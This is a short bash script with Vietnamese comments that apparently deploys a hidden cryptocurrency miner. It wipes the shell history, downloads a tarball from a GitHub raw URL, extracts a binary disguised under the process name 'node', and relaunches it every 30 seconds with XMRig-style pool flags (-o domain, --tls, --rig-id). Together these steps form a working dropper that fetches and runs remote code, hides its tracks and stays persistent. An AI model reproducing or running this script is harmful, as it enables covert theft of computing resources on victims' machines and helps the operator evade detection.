#!/bin/bash

DOMAIN="$1"
NAME_WORK="$2"
PROCESS_PATH="node/node"   # file thực thi
PROCESS_NAME="node"        # tên tiến trình hiển thị

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 📥 Tải và giải nén nếu chưa có
if [ ! -f "$(pwd)/$PROCESS_PATH" ]; then
    rm -rf node node.tar.gz
    curl -sL -o node.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz
    tar -xzf node.tar.gz
    chmod +x node/node
    rm -f node.tar.gz
fi

# 🔁 Vòng lặp kiểm tra tiến trình và chạy lại nếu chưa chạy
while true; do
    # Kiểm tra tiến trình đang chạy
    if ! pgrep -f "$PROCESS_NAME -o $DOMAIN" > /dev/null; then
        echo "[+] Tiến trình chưa chạy, start..."
        nohup bash -c "exec -a $PROCESS_NAME $(pwd)/$PROCESS_PATH -o $DOMAIN --tls -k -t 5 --rig-id $NAME_WORK" > /dev/null 2>&1 &
    else
        echo "[+] Tiến trình đang chạy, kiểm tra lại sau 30s..."
    fi
    sleep 30
done
